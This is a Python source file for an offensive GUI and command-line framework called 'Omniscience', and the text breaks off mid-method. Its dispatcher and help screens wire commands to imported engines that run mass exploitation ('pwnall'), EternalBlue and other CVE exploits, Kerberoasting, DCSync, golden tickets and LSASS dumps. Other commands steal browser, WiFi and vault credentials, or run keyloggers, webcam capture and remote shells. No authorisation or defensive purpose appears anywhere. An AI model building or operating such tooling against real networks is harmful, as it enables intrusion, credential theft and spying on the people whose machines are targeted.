#!/usr/bin/env python3
"""
Omniscience Framework Pro - Enhanced GUI with Real CLI
A professional network reconnaissance and remote access platform
With full CLI functionality - runs standalone or in GUI
REAL MODE - Complete Autonomous Network Domination Engine Integration
"""

import sys
import os
import socket
import subprocess
import threading
import json
import re
import uuid
import hashlib
import platform
import struct
import base64
import time
from datetime import datetime
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed

# Framework imports - real exploitation engine
try:
    from omnisec_engine import OmniSecEngine, Device, EXPLOIT_MAP
    OMNISEC_AVAILABLE = True
except ImportError:
    OMNISEC_AVAILABLE = False

try:
    from commandcenter import OmniShell
    COMMANDCENTER_AVAILABLE = True
except ImportError:
    COMMANDCENTER_AVAILABLE = False

try:
    from remote_control import AgentlessControl
    REMOTE_CONTROL_AVAILABLE = True
except ImportError:
    REMOTE_CONTROL_AVAILABLE = False

try:
    from passive_intel import AgentlessIntelligence
    INTEL_AVAILABLE = True
except ImportError:
    INTEL_AVAILABLE = False

# Database drivers
try:
    import pymysql
    PYMYSQL_AVAILABLE = True
except ImportError:
    PYMYSQL_AVAILABLE = False

try:
    import psycopg2
    PSYCOPG2_AVAILABLE = True
except ImportError:
    PSYCOPG2_AVAILABLE = False

try:
    import paramiko
    PARAMIKO_AVAILABLE = True
except ImportError:
    PARAMIKO_AVAILABLE = False

try:
    from impacket.smbconnection import SMBConnection
    IMPACKET_AVAILABLE = True
except ImportError:
    IMPACKET_AVAILABLE = False

try:
    import scapy.all as scapy
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

from PyQt6.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
    QTabWidget, QTextEdit, QLineEdit, QPushButton, QTableWidget,
    QTableWidgetItem, QLabel, QProgressBar, QTreeWidget, QTreeWidgetItem,
    QMenuBar, QMenu, QToolBar, QStatusBar, QDialog, QComboBox,
    QCheckBox, QGroupBox, QFormLayout, QSplitter, QFrame, QScrollArea,
    QListWidget, QListWidgetItem, QCalendarWidget, QSpinBox, QSlider,
    QGraphicsView, QGraphicsScene, QGraphicsEllipseItem, QGraphicsLineItem,
    QGraphicsTextItem, QGraphicsItem, QDialogButtonBox, QMessageBox, QInputDialog,
    QFileDialog, QColorDialog, QFontDialog, QListView, QProgressBar
)
from PyQt6.QtCore import (
    Qt, QTimer, QThread, pyqtSignal, QSize, QRect, QPoint,
    QPropertyAnimation, QEasingCurve, QParallelAnimationGroup,
    QPointF, QRectF, QAbstractListModel, QModelIndex
)
from PyQt6.QtGui import (
    QAction, QIcon, QColor, QBrush, QPen, QFont, QCursor,
    QTextCursor, QTextCharFormat, QTextFormat, QPainter, QPixmap,
    QKeySequence, QShortcut, QLinearGradient, QConicalGradient
)

# Color scheme - Futuristic Cyberpunk Theme
DARK_BG = "#0a0a0f"
DARKER_BG = "#050508"
ACCENT = "#00f0ff"  # Cyan
ACCENT2 = "#ff0055"  # Pink/Red
ACCENT3 = "#00ff88"  # Green
SUCCESS = "#00ff88"
WARNING = "#ffcc00"
ERROR = "#ff0055"
TEXT = "#e0e0e0"
TEXT_DIM = "#666680"
PURPLE = "#aa00ff"
CYAN = "#00f0ff"
GOLD = "#ffd700"
ORANGE = "#ff6600"

# Gradient colors for futuristic look
GRADIENT_START = "#0a0a1a"
GRADIENT_MID = "#1a0a2a"
GRADIENT_END = "#0a1a2a"
GRADIENT_END = "#0a1a2a"

# Additional engine imports for extended CLI functionality
try:
    from exploit_engine import UniversalNetworkAccess, UniversalDevice
    EXPLOIT_ENGINE_AVAILABLE = True
except ImportError:
    EXPLOIT_ENGINE_AVAILABLE = False
    UniversalNetworkAccess = None
    UniversalDevice = None

try:
    from lateral_movement import AdvancedCommandCenter as LateralMovement
    LATERAL_AVAILABLE = True
except ImportError:
    LATERAL_AVAILABLE = False
    LateralMovement = None

try:
    from omnisec_cli_window import RealCLIManager as _RealCLIManager, OmniSecCLIWindow
    REALCLI_AVAILABLE = True
except ImportError as e:
    print(f"Warning: RealCLIManager unavailable: {e}")
    REALCLI_AVAILABLE = False
    _RealCLIManager = None
    OmniSecCLIWindow = None

# ==================== REAL CLI MANAGER ====================

class CLIManager:
    """REAL MODE CLI Manager - executes actual framework operations"""
    
    def __init__(self, gui_callback=None):
        self.gui_callback = gui_callback
        self.history = []
        self.history_index = -1
        self.variables = {}
        self.modules_loaded = {}
        self.current_target = None
        self.sessions = {}
        self.credentials = {}
        
        # Real functional engines
        self.engine = OmniSecEngine() if OMNISEC_AVAILABLE else None
        self.control = AgentlessControl() if REMOTE_CONTROL_AVAILABLE else None
        self.intel = AgentlessIntelligence() if INTEL_AVAILABLE else None
        
        # Fallback to Universal Access if Engine is unavailable
        self.universal = None
        if not self.engine and 'UniversalNetworkAccess' in globals():
            self.universal = UniversalNetworkAccess()

        # State tracking
        self.harvested_data = {}
        
    def execute(self, command):
        """Execute CLI command with REAL operations"""
        if not command.strip():
            return ""
            
        self.history.append(command)
        self.history_index = len(self.history)
        
        parts = command.strip().split()
        cmd = parts[0].lower()
        args = parts[1:]
        
        result = ""
        
        # Core commands
        if cmd == "help":
            result = self.show_help()
        elif cmd == "clear" or cmd == "cls":
            result = "CLEAR"
        elif cmd == "exit":
            result = "EXIT"
        elif cmd == "quit":
            result = "EXIT"
        elif cmd == "set":
            result = self.set_variable(args)
        elif cmd == "show":
            result = self.show(args)
        elif cmd == "use":
            result = self.use_module(args)
        elif cmd == "info":
            result = self.info(args)
        elif cmd == "options":
            result = self.show_options()
        elif cmd == "back":
            result = self.back()
        # Network commands
        elif cmd == "scan":
            result = self.scan_network(args)
        elif cmd == "arp":
            result = self.run_command("arp -a")
        elif cmd == "ipconfig":
            result = self.run_command("ipconfig /all")
        elif cmd == "ifconfig":
            result = self.run_command("ipconfig")
        elif cmd == "netstat":
            result = self.run_command("netstat -an")
        elif cmd == "nbtstat":
            result = self.run_command("nbtstat -c")
        elif cmd == "nslookup":
            result = self.run_command(f"nslookup {args[0]}" if args else "nslookup")
        elif cmd == "tracert":
            result = self.run_command(f"tracert {args[0]}" if args else "tracert 8.8.8.8")
        elif cmd == "ping":
            result = self.run_command(f"ping {' '.join(args)}" if args else "ping -n 2 127.0.0.1")
        # System commands
        elif cmd == "whoami":
            result = self.run_command("whoami /all")
        elif cmd == "systeminfo":
            result = self.run_command("systeminfo")
        elif cmd == "hostname":
            result = self.run_command("hostname")
        elif cmd == "tasklist":
            result = self.run_command("tasklist /v")
        elif cmd == "netstart":
            result = self.run_command("net start")
        elif cmd == "users":
            result = self.run_command("net user")
        elif cmd == "groups":
            result = self.run_command("net localgroup")
        elif cmd == "admin":
            result = self.run_command("net localgroup Administrators")
        # Session commands
        elif cmd == "sessions":
            result = self.list_sessions()
        elif cmd == "interact":
            result = self.interact_session(args)
        elif cmd == "kill":
            result = self.kill_session(args)
        elif cmd == "background":
            result = self.background_session()
        # Credential commands
        elif cmd == "creds":
            result = self.list_credentials()
        elif cmd == "add_cred":
            result = self.add_credential(args)
        # Real PC Control commands
        elif cmd == "shell":
            result = self.shell(args)
        elif cmd == "download":
            result = self.download_file(args)
        elif cmd == "upload":
            result = self.upload_file(args)
        elif cmd == "screenshot":
            result = self.screenshot(args)
        elif cmd == "webcam":
            result = self.webcam(args)
        elif cmd == "keylog":
            result = self.keylogger(args)
        elif cmd == "clipboard":
            result = self.clipboard(args)
        elif cmd == "processes":
            result = self.list_processes(args)
        elif cmd == "killproc":
            result = self.kill_process(args)
        elif cmd == "registry":
            result = self.registry(args)
        elif cmd == "services":
            result = self.list_services(args)
        elif cmd == "start_service":
            result = self.start_service(args)
        elif cmd == "stop_service":
            result = self.stop_service(args)
        # Network control
        elif cmd == "connect":
            result = self.connect_target(args)
        elif cmd == "disconnect":
            result = self.disconnect_target()
        elif cmd == "pivot":
            result = self.pivot(args)
        elif cmd == "portfwd":
            result = self.port_forward(args)
        elif cmd == "reverse_shell":
            result = self.reverse_shell(args)
        elif cmd == "bind_shell":
            result = self.bind_shell(args)
        # Message/Chat
        elif cmd == "msg" or cmd == "message":
            result = self.send_message(args)
        elif cmd == "inbox":
            result = self.show_inbox()
        elif cmd == "broadcast":
            result = self.broadcast(args)
        # Advanced exploitation commands
        elif cmd == "exploit":
            result = self.exploit_target(args)
        elif cmd == "pwn":
            result = self.pwn_target(args)
        elif cmd in ["pwnall", "attack"]:
            result = self.pwn_all(args)
        elif cmd == "etblue":
            result = self.exploit_eternalblue(args)
        # Database commands
        elif cmd == "dbdump":
            result = self.dump_database(args)
        # Kerberos attacks
        elif cmd == "kerberoast":
            result = self.kerberoast_attack(args)
        elif cmd == "asreproast":
            result = self.asreproast_attack(args)
        elif cmd == "dcsync":
            result = self.dcsync_attack(args)
        elif cmd == "golden":
            result = self.golden_ticket_attack(args)
        # Credential harvesting
        elif cmd in ["lsass", "lsass-dump"]:
            result = self.dump_lsass(args)
        elif cmd in ["browser", "stealcreds"]:
            result = self.harvest_browser(args)
        elif cmd in ["wifi", "steal-wifi"]:
            result = self.harvest_wifi(args)
        elif cmd in ["vault", "harvest", "extract"]:
            result = self.harvest_vault(args)
        # Control commands
        elif cmd in ["exec", "wmi-exec"]:
            result = self.wmi_exec(args)
        elif cmd in ["ls", "dir"]:
            result = self.smb_list(args)
        elif cmd in ["cat", "read"]:
            result = self.smb_read(args)
        else:
            # Try as shell command
            result = self.run_command(command)
            
        return result
    
    def get_banner(self):
        """Cloned modern banner from commandcenter"""
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        
        banner_txt = [
            "██████╗ ███╗   ███╗███╗   ██╗██╗███████╗ ██████╗██╗███████╗███╗   ██╗ ██████╗███████╗",
            "██╔═══██╗████╗ ████║████╗  ██║██║██╔════╝██╔════╝██║██╔════╝████╗  ██║██╔════╝██╔════╝",
            "██║   ██║██╔████╔██║██╔██╗ ██║██║███████╗██║     ██║█████╗  ██╔██╗ ██║██║     █████╗  ",
            "██║   ██║██║╚██╔╝██║██║╚██╗██║██║╚════██║██║     ██║██╔══╝  ██║╚██╗██║██║     ██╔══╝  ",
            "╚██████╔╝██║ ╚═╝ ██║██║ ╚████║██║███████╗╚██████╗██║███████╗██║ ╚████║╚██████╗███████╗",
        ]
        
        res = "\n"
        for line in banner_txt:
            res += f"<font color='{ACCENT}'>{line}</font>\n"
        res += f"<font color='{PURPLE}'><b>[SYSTEM]</b></font> {platform.system().upper()} | <font color='{PURPLE}'><b>[HOST]</b></font> {hostname} | <font color='{PURPLE}'><b>[LAN]</b></font> {local_ip}\n"
        res += f"<font color='{ACCENT3}'><b>[READY]</b></font> OMNISCIENCE REAL ENGINE v7.1-ULTRAMAX LOADED.\n"
        return res

    def show_help(self):
        return """╔══════════════════════════════════════════════════════════════════════════════╗
║                    OMNISCIENCE REAL COMMANDS (Production)                    ║
╠══════════════════════════════════════════════════════════════════════════════╣
║  EXPLOITATION                                                                  ║
║  ─────────────────────────────────────────────────────────────────────────────  ║
║    pwn <ip>          - Automated multi-vector exploit chain (Real)            ║
║    attack / pwnall   - Global network domination sequence                     ║
║    etblue <ip>       - MS17-010 EternalBlue exploitation                      ║
║    printnightmare    - CVE-2021-34527 RPC spooler RCE                         ║
║    smbghost <ip>     - CVE-2020-0796 SMBv3 compression RCE                    ║
║    zerologon <ip>    - Netlogon privilege escalation                          ║
║                                                                               ║
║  DOMAIN DOMINATION                                                             ║
║  ─────────────────────────────────────────────────────────────────────────────  ║
║    kerberoast <dc>   - Extract SPN tickets for cracking                       ║
║    dcsync <dc>       - Dump domain user hashes via DRSUAPI                    ║
║    asreproast <dc>   - Extract tickets for users with no pre-auth             ║
║    golden <dom> <sid>- Forge Golden TGT for 10-year persistence               ║
║                                                                               ║
║  DATA EXTRACTION                                                               ║
║  ─────────────────────────────────────────────────────────────────────────────  ║
║    harvest / extract - Full automated data package retrieval                  ║
║    lsass-dump <ip>   - MiniDump LSASS for plaintext/NTLM recovery             ║
║    stealcreds <ip>   - Harvest AES-GCM browser credentials                    ║
║    steal-wifi <ip>   - Extract all stored WiFi profiles/keys                  ║
║    vault <ip>        - Dump Windows Vault and DPAPI tokens                    ║
║                                                                               ║
║  CONTROL & SESSIONS                                                            ║
║  ─────────────────────────────────────────────────────────────────────────────  ║
║    exec <cmd>        - Agentless RCE via WMI/DCOM/SSH                         ║
║    ls <path>         - Remote directory listing via SMB/SFTP                  ║
║    cat <path>        - Read remote file content                               ║
║    sessions          - List active interactive command sessions                ║
║    interact <id>     - Attach to live remote shell                            ║
║                                                                               ║
║  CLOUD & DB                                                                    ║
║  ─────────────────────────────────────────────────────────────────────────────  ║
║    dbdump <ip> <t>   - Full database dump (SQL/Mongo/Redis)                   ║
║    cloud <type>      - Launch cloud metadata attack (AWS/Azure)               ║
║    s3-scan <bucket>  - Audit S3 for anonymous permissions                     ║
╚══════════════════════════════════════════════════════════════════════════════╝"""

    def set_variable(self, args):
        if len(args) >= 2:
            self.variables[args[0]] = " ".join(args[1:])
            return f"[*] {args[0]} => {' '.join(args[1:])}"
        return "Usage: set <variable> <value>"

    def show(self, args):
        if not args:
            return "Usage: show <modules|sessions|creds|network|messages|options>"
        
        what = args[0].lower()
        if what == "modules":
            return self.show_modules()
        elif what == "sessions":
            return self.list_sessions()
        elif what == "creds":
            return self.list_credentials()
        elif what == "network":
            return self.show_network()
        elif what == "messages":
            return self.show_inbox()
        elif what == "options":
            return self.show_options()
        return f"Unknown option: {what}"

    # ==================== ADVANCED REAL EXPLOITATION ====================
    
    def exploit_target(self, args):
        """Run full exploit chain on target"""
        if not args:
            if not self.current_target:
                return "Usage: exploit <ip> or set target first"
            target = self.current_target
        else:
            target = args[0]
        
        if not self.engine:
            return "<font color='#ff0000'>[!] Engine unavailable.</font>"
        
        device = Device(target)
        device = self.engine.fingerprint_device(device)
        
        result = f"[*] Fingerprinted {target}: {device.os}\n"
        result += f"[*] Open ports: {list(device.open_ports.keys())}\n"
        result += f"[*] Vulnerabilities: {device.vulnerabilities}\n"
        
        if self.engine.exploit_device(device):
            result += f"[+] EXPLOIT SUCCESSFUL! Access via: {device.access_method}\n"
            self.sessions[str(uuid.uuid4())[:8]] = {
                'ip': target,
                'platform': device.os,
                'user': 'SYSTEM' if 'windows' in device.os.lower() else 'root',
                'status': 'active',
                'created': datetime.now().strftime("%Y-%m-%d %H:%M")
            }
        else:
            result += "[-] Exploit failed"
        
        return result
    
    def pwn_all(self, args):
        """Automated exploitation of all discovered devices"""
        if not self.engine:
            return "[!] Engine unavailable"
        
        # Use AMMO v2 for mass exploitation
        self._log("[!] Launching mass attack sequence...")
        results = self.engine.pwn_all()
        
        output = f"[+] Exploitation complete!\n"
        output += f"[+] Exploited: {len(results['exploited'])}\n"
        output += f"[-] Failed: {len(results['failed'])}\n\n"
        
        for exp in results['exploited']:
            output += f"  [+] {exp['ip']} - {exp['method']} ({exp['os']})\n"
        
        return output
    
    def dump_database(self, args):
        """Dump database contents"""
        if len(args) < 2:
            return "Usage: dbdump <ip> <db_type> [port]"
        
        target = args[0]
        db_type = args[1]
        port = int(args[2]) if len(args) > 2 else None
        
        if not self.control: return "[!] Control engine unavailable"
        
        result = self.control.full_database_dump(target, port, db_type)
        
        if result["success"]:
            output = f"[+] Database dump successful!\n"
            output += f"[+] Databases: {result['databases']}\n"
            output += f"[+] Tables: {len(result['tables'])}\n"
            output += f"[+] Rows extracted: {result['total_rows']}\n"
            return output
        else:
            return f"[-] Database dump failed: {result.get('error', 'Unknown error')}"
    
    # ==================== KERBEROS ATTACKS ====================
    
    def kerberoast_attack(self, args):
        """Kerberoasting attack"""
        if not args:
            return "Usage: kerberoast <dc_ip> [domain]"
        
        dc_ip = args[0]
        domain = args[1] if len(args) > 1 else "DOMAIN.LOCAL"
        
        if not self.control: return "[!] Control engine unavailable"
        result = self.control.kerberoast(dc_ip, domain)
        
        if result.get("success"):
            output = f"[+] Kerberoasting successful!\n"
            output += f"[+] SPNs found: {result.get('spn_count', 0)}\n"
            for spn in result['spn_found']:
                output += f"  - {spn['spn']}\n"
            return output
        return f"[-] Kerberoasting failed: {result.get('error', 'Unknown')}"
    
    def asreproast_attack(self, args):
        """AS-REP roasting attack"""
        if not args:
            return "Usage: asreproast <dc_ip> [domain]"
        
        dc_ip = args[0]
        domain = args[1] if len(args) > 1 else "DOMAIN.LOCAL"
        
        if not self.control: return "[!] Control engine unavailable"
        result = self.control.asreproast(dc_ip, domain)
        
        if result.get("success"):
            output = f"[+] AS-REP roasting successful!\n"
            output += f"[+] Users with no pre-auth: {result.get('vulnerable_users', [])}\n"
            return output
        return f"[-] AS-REP roasting failed: {result.get('error', 'Unknown')}"
    
    def dcsync_attack(self, args):
        """DCSync attack to dump domain credentials"""
        if len(args) < 3:
            return "Usage: dcsync <dc_ip> <username> <password> [domain]"
        
        dc_ip = args[0]
        username = args[1]
        password = args[2]
        domain = args[3] if len(args) > 3 else "DOMAIN.LOCAL"
        
        if not self.control: return "[!] Control engine unavailable"
        result = self.control.dcsync(dc_ip, username, password, domain=domain)
        
        if result.get("success"):
            return f"[+] DCSync replication initiated. Method: {result.get('method')}"
        return f"[-] DCSync failed: {result.get('error', 'Unknown')}"
    
    def golden_ticket_attack(self, args):
        """Create golden ticket for domain persistence"""
        if len(args) < 4:
            return "Usage: golden <domain> <sid> <krbtgt_hash> [username]"
        
        domain = args[0]
        sid = args[1]
        krbtgt_hash = args[2]
        username = args[3] if len(args) > 3 else "Administrator"
        
        if not self.control: return "[!] Control engine unavailable"
        path = self.control.golden_ticket(domain, sid, krbtgt_hash, username)
        
        if path:
            return f"[+] Golden ticket forged and saved to: {path}"
        return "[-] Golden ticket creation failed."
    
    # ==================== CREDENTIAL HARVESTING ====================
    
    def dump_lsass(self, args):
        """Dump LSASS memory for credential extraction"""
        target = args[0] if args else self.current_target
        if not target: return "Usage: lsass <ip>"
        
        username = args[1] if len(args) > 1 else self.credentials.get(target, {}).get('user', 'Administrator')
        password = args[2] if len(args) > 2 else self.credentials.get(target, {}).get('pass', '')
        
        if not self.control: return "[!] Control engine unavailable"
        result = self.control.lsass_extract_hashes(target, username, password)
        
        if result.get("success"):
            output = f"[+] LSASS extraction successful!\n"
            for entry in result.get('hashes', []):
                output += f"  {entry['user']}:{entry['ntlm']}\n"
            return output
        return f"[-] LSASS dump failed: {result.get('error', 'Unknown')}"
    
    def harvest_browser(self, args):
        """Harvest browser saved credentials"""
        target = args[0] if args else self.current_target
        if not target: return "Usage: browser <ip>"
        
        username = self.credentials.get(target, {}).get('user', 'Administrator')
        password = self.credentials.get(target, {}).get('pass', '')
        
        if not self.control: return "[!] Control engine unavailable"
        result = self.control.get_browser_passwords(target, username, password)
        
        if result.get("passwords"):
            output = f"[+] Browser credentials harvested:\n"
            for cred in result['passwords']:
                output += f"  {cred['browser']}: {cred['url']} -> {cred['user']}\n"
            return output
        return "[-] Browser credential harvest yielded no results or failed."
    
    def harvest_wifi(self, args):
        """Harvest WiFi passwords"""
        target = args[0] if args else self.current_target
        if not target: return "Usage: wifi <ip>"
        
        username = self.credentials.get(target, {}).get('user', 'Administrator')
        password = self.credentials.get(target, {}).get('pass', '')
        
        if not self.control: return "[!] Control engine unavailable"
        result = self.control.get_wifi_passwords(target, username, password)
        
        if result.get("networks"):
            output = f"[+] WiFi passwords harvested:\n"
            for ssid, pw in result['networks'].items():
                output += f"  {ssid}: {pw}\n"
            return output
        return "[-] WiFi password harvest yielded no results or failed."
    
    def harvest_vault(self, args):
        """Harvest vault and token data"""
        target = args[0] if args else self.current_target
        if not target: return "Usage: vault <ip>"
        
        username = self.credentials.get(target, {}).get('user', 'Administrator')
        password = self.credentials.get(target, {}).get('pass', '')
        
        if not self.control: return "[!] Control engine unavailable"
        result = self.control.extract_all_data(target, username, password)
        
        output = f"[+] Deep harvest completed on {target}.\n"
        output += f"  - Credentials: {len(result.get('credentials', {}).get('passwords', []))}\n"
        output += f"  - WiFi: {len(result.get('wifi', {}).get('networks', {}))}\n"
        output += f"  - Hashes: {len(result.get('hashes', {}).get('hashes', []))}\n"
        return output
    
    def wmi_exec(self, args):
        """Execute command via WMI"""
        if not args:
            return "Usage: exec <command>"
        
        if not self.current_target:
            return "No target set"
        
        cmd = " ".join(args)
        username = self.credentials.get(self.current_target, {}).get('user', 'Administrator')
        password = self.credentials.get(self.current_target, {}).get('pass', '')
        
        if not self.control: return "[!] Control unavailable"
        result = self.control.wmi_exec(self.current_target, username, password, cmd)
        return f"[{self.current_target}] {cmd}\n{result.get('output', 'Command initiated.')}"
    
    # ==================== SMB FILE OPERATIONS ====================
    
    def smb_list(self, args):
        """List files via SMB"""
        remote_path = args[0] if args else "*"
        if not self.current_target:
            return "Usage: ls <remote_path> or set target first"
        
        username = self.credentials.get(self.current_target, {}).get('user', 'Administrator')
        password = self.credentials.get(self.current_target, {}).get('pass', '')
        
        if not self.control: return "[!] Control unavailable"
        result = self.control.smb_list(self.current_target, "C$", remote_path, username, password)
        
        if result:
            output = f"[+] Directory listing of {remote_path}:\n"
            for f in result:
                output += f"  {'[D]' if f['dir'] else '   '} {f['name']:<30} {f['size']}\n"
            return output
        return "[-] SMB list failed or returned no files."
    
    def smb_read(self, args):
        """Read file via SMB"""
        if not args:
            return "Usage: cat <remote_path>"
        
        if not self.current_target:
            return "No target set"
        
        remote_path = args[0]
        username = self.credentials.get(self.current_target, {}).get('user', 'Administrator')
        password = self.credentials.get(self.current_target, {}).get('pass', '')
        
        if not self.control: return "[!] Control unavailable"
        result = self.control.smb_read_file(self.current_target, "C$", remote_path, username, password)
        
        if result:
            return f"[+] Content of {remote_path}:\n{result.decode(errors='replace')}"
        return f"[-] SMB read failed for {remote_path}."
    
    def _log(self, msg):
        if self.gui_callback: self.gui_callback(msg)


class CLIManager(_RealCLIManager):
    """Fully integrated CLI manager with real engine operations and command parsing."""
    
    def __init__(self, gui_callback=None):
        self.gui_callback = gui_callback
        self.history = []
        self.history_index = -1
        self.variables = {}
        self.modules_loaded = {}
        engines = {}
        if OMNISEC_AVAILABLE:
            engines['omnisec'] = OmniSecEngine()
        else:
            engines['omnisec'] = None

        if 'EXPLOIT_ENGINE_AVAILABLE' in globals() and EXPLOIT_ENGINE_AVAILABLE:
            try:
                engines['exploit'] = UniversalNetworkAccess()
            except Exception:
                engines['exploit'] = None
        else:
            engines['exploit'] = None

        if REMOTE_CONTROL_AVAILABLE:
            engines['control'] = AgentlessControl()
        else:
            engines['control'] = None

        if INTEL_AVAILABLE:
            engines['intel'] = AgentlessIntelligence()
        else:
            engines['intel'] = None

        try:
            if LATERAL_AVAILABLE:
                engines['lateral'] = LateralMovement()
            else:
                engines['lateral'] = None
        except Exception:
            engines['lateral'] = None

        super().__init__(engines)

    def _log(self, msg):
        if self.gui_callback:
            self.gui_callback(msg)

    # ─── Command Dispatcher ───
    def execute(self, command):
        if not command.strip():
            return ""
        self.history.append(command)
        self.history_index = len(self.history)
        parts = command.strip().split()
        cmd = parts[0].lower()
        args = parts[1:]
        try:
            if cmd == "help":
                return self.show_help()
            elif cmd in ("clear", "cls"):
                return "CLEAR"
            elif cmd in ("exit", "quit"):
                return "EXIT"
            elif cmd == "set":
                return self.set_variable(args)
            elif cmd == "show":
                return self.show(args)
            elif cmd == "use":
                return self.use_module(args)
            elif cmd == "info":
                return self.info(args)
            elif cmd == "options":
                return self.show_options()
            elif cmd == "back":
                return self.back()
            elif cmd == "scan":
                return self.scan_network(args)
            elif cmd in ("arp", "ipconfig", "ifconfig", "netstat", "nbtstat", "nslookup", "tracert", "ping",
                         "whoami", "systeminfo", "hostname", "tasklist", "netstart", "users", "groups", "admin"):
                return self.run_command(command)
            elif cmd == "sessions":
                return self.list_sessions()
            elif cmd == "interact":
                return self.interact_session(args)
            elif cmd == "kill":
                return self.kill_session(args)
            elif cmd == "background":
                return self.background_session()
            elif cmd == "creds":
                return self.list_credentials()
            elif cmd == "add_cred":
                return self.add_credential(args)
            elif cmd == "shell":
                return self.shell(args)
            elif cmd == "download":
                return self.download_file(args)
            elif cmd == "upload":
                return self.upload_file(args)
            elif cmd == "screenshot":
                return self.screenshot(args)
            elif cmd == "webcam":
                return self.webcam(args)
            elif cmd == "keylog":
                return self.keylogger(args)
            elif cmd == "clipboard":
                return self.clipboard(args)
            elif cmd == "processes":
                return self.list_processes(args)
            elif cmd == "killproc":
                return self.kill_process(args)
            elif cmd == "registry":
                return self.registry(args)
            elif cmd == "services":
                return self.list_services(args)
            elif cmd == "start_service":
                return self.start_service(args)
            elif cmd == "stop_service":
                return self.stop_service(args)
            elif cmd == "connect":
                return self.connect_target(args)
            elif cmd == "disconnect":
                return self.disconnect_target()
            elif cmd == "pivot":
                return self.pivot(args)
            elif cmd == "exploit":
                return self.exploit_target_method(args)
            elif cmd == "pwn":
                return self.pwn_target(args)
            elif cmd in ("pwnall", "attack"):
                return self.pwn_all(args)
            elif cmd == "dbdump":
                return self.dump_database(args)
            elif cmd == "kerberoast":
                return self.kerberoast_attack(args)
            elif cmd == "asreproast":
                return self.asreproast_attack(args)
            elif cmd == "dcsync":
                return self.dcsync_attack(args)
            elif cmd == "golden":
                return self.golden_ticket_attack(args)
            elif cmd in ("lsass", "lsass-dump"):
                return self.dump_lsass(args)
            elif cmd in ("browser", "stealcreds"):
                return self.harvest_browser(args)
            elif cmd in ("wifi", "steal-wifi"):
                return self.harvest_wifi(args)
            elif cmd in ("vault", "harvest", "extract"):
                return self.harvest_vault(args)
            elif cmd in ("exec", "wmi-exec"):
                return self.wmi_exec(args)
            elif cmd in ("ls", "dir"):
                return self.smb_list(args)
            elif cmd in ("cat", "read"):
                return self.smb_read(args)
            else:
                return self.run_command(command)
        except Exception as e:
            return f"[!] Execution error: {e}"

    def get_banner(self):
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        banner_txt = [
            "██████╗ ███╗   ███╗███╗   ██╗██╗███████╗ ██████╗██╗███████╗███╗   ██╗ ██████╗███████╗",
            "██╔═══██╗████╗ ████║████╗  ██║██║██╔════╝██╔════╝██║██╔════╝████╗  ██║██╔════╝██╔════╝",
            "██║   ██║██╔████╔██║██╔██╗ ██║██║███████╗██║     ██║█████╗  ██╔██╗ ██║██║     █████╗  ",
            "██║   ██║██║╚██╔╝██║██║╚██╗██║██║╚════██║██║     ██║██╔══╝  ██║╚██╗██║██║     ██╔══╝  ",
            "╚██████╔╝██║ ╚═╝ ██║██║ ╚████║██║███████╗╚██████╗██║███████╗██║ ╚████║╚██████╗███████╗",
        ]
        res = "\n"
        for line in banner_txt:
            res += f"<font color='{ACCENT}'>{line}</font>\n"
        res += f"<font color='{PURPLE}'><b>[SYSTEM]</b></font> {platform.system().upper()} | <font color='{PURPLE}'><b>[HOST]</b></font> {hostname} | <font color='{PURPLE}'><b>[LAN]</b></font> {local_ip}\n"
        res += f"<font color='{ACCENT3}'><b>[READY]</b></font> OMNISCIENCE REAL ENGINE v7.1-ULTRAMAX LOADED.\n"
        return res

    def show_help(self):
        return """╔══════════════════════════════════════════════════════════════════════════════╗
║                    OMNISCIENCE REAL COMMANDS (Production)                    ║
╠══════════════════════════════════════════════════════════════════════════════╣
║  DISCOVERY & RECON                                                             ║
║  ─────────────────────────────────────────────────────────────────────────────  ║
║    scan [range]      - Discover devices on network (real ARP/ICMP scan)         ║
║    devices           - List discovered devices                                ║
║    info [target]     - System information about target                       ║
║                                                                               ║
║  EXPLOITATION                                                                  ║
║  ─────────────────────────────────────────────────────────────────────────────  ║
║    pwn <ip>          - Automated exploit chain against target                 ║
║    pwnall / attack   - Exploit all discovered devices                         ║
║                                                                               ║
║  DATA HARVESTING                                                               ║
║  ─────────────────────────────────────────────────────────────────────────────  ║
║    harvest / extract - Extract all data                                        ║
║    creds <ip>        - Harvest browser credentials                            ║
║    wifi <ip>         - Harvest WiFi passwords                                 ║
║    lsass <ip>        - Dump LSASS hashes                                      ║
║    vault <ip>        - Dump Windows Vault and DPAPI tokens                    ║
║                                                                               ║
║  REMOTE CONTROL                                                                ║
║  ─────────────────────────────────────────────────────────────────────────────  ║
║    shell <cmd>       - Execute command on target via WMI                      ║
║    exec <cmd>        - Alias for shell                                         ║
║    ls [path]         - List remote files via SMB                               ║
║    cat <file>        - Read remote file                                        ║
║    screenshot        - Capture desktop                                        ║
║    processes         - List running processes                                 ║
║    killproc <pid>    - Kill process by PID                                    ║
║    services          - List Windows services                                  ║
║    start_service <n> - Start service                                           ║
║    stop_service <n>  - Stop service                                            ║
║                                                                               ║
║  NETWORK DIAGNOSTICS (local)                                                    ║
║    arp, ipconfig, netstat, ping, nslookup, tracert, whoami, systeminfo, etc.  ║
║                                                                               ║
║  SESSIONS                                                                       ║
║    sessions          - List active sessions                                   ║
║    interact <id>     - Interact with session                                   ║
║    kill <id>         - Terminate session                                       ║
║                                                                               ║
║  KERBEROS ATTACKS                                                               ║
║    kerberoast <dc>   - Kerberoasting                                           ║
║    asreproast <dc>   - AS-REP roasting                                         ║
║    dcsync <dc> <u> <p> - DCSync replication                                    ║
║    golden <dom> <sid> <hash> [user] - Golden Ticket                            ║
║                                                                               ║
║  DATABASE                                                                       ║
║    dbdump <ip> <type> [port] - Database dump                                   ║
║                                                                               ║
║  UTILITY                                                                        ║
║    set <var> <val>   - Set variable                                            ║
║    show <modules|sessions|creds|network|options>                              ║
║    use <module|ip>   - Select module or target                                 ║
║    options           - Show options                                            ║
║    back              - Clear module selection                                  ║
╚══════════════════════════════════════════════════════════════════════════════╝"""

    def set_variable(self, args):
        if len(args) >= 2:
            self.variables[args[0]] = " ".join(args[1:])
            return f"[*] {args[0]} => {' '.join(args[1:])}"
        return "Usage: set <variable> <value>"

    def show(self, args):
        if not args:
            return "Usage: show <modules|sessions|creds|network|options>"
        what = args[0].lower()
        if what == "modules":
